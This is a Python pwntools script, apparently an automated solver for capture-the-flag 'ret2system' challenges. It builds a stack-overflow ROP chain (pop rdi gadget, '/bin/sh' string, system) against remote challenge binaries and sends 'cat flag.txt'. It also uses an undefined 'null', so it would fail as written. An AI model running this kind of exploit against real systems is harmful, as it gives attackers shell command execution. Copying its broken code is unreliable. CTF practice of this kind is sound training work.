from pwn import *
import detection
import re


# context.log_level = 'ERROR'
# logging.disable(logging.CRITICAL)

# im aware this looks like trash but ill fix it in post


def exploit(binary: str):
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    p = remote(url, 443, ssl=True, sni=url)
    if p:
        print('[+] Connected to host')
    e = ELF(binary)
    r = ROP(e)

    p.recvuntil(b'>>>\n')

    payload = b'complexity'

    system = null
    pop_rdi = null

    try:
        pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]
        print(f"[+] Location of pop RDI : {hex(pop_rdi)}")
    except:
        print('[!] pop rdi; ret; not found')
        pass

    try:
        system = e.sym['system']
        print(f"[+] System Address: {hex(system)}")
    except KeyError:
        print('[!] System not found in a ret2system lol')

    offset = detection.find_rip_offset(binary)
    print("[+] Offset:", offset)
    payload += cyclic(offset)
    payload += p64(pop_rdi)

    try:
        shell = next(e.search(b'/bin/sh'))
        print(f"[+]Location of bin/sh: {hex(shell)}")
        payload += p64(shell)
        payload += p64(system)
        p.sendline(payload)
        # p.wait()
        p.sendline(b'cat flag.txt')
    except:
        print('[!] bin/shell not found')
        try:
            cat = next(e.search(b'/bin/cat flag.txt'))
            print(f"[+] Location of bin/cat flag.txt: {hex(cat)} {cat}")
            payload += p64(cat)
            payload += p64(system)
            p.sendline(payload)
        except:
            print('[!] Bin/cat flag not found')
            pass

    output = p.recvall(timeout=0.2)
    print(f"output: {output}")
    flag = re.findall(flag_regex, output.decode())
    if flag:
        return flag[0]
    else:
        return


def main():  # TEMP FOR TESTING
    for i in range(10):
        print(f"bin-ret2system-{i}")
        flag = exploit(f"bin-ret2system-{i}")
        print(flag)


main()
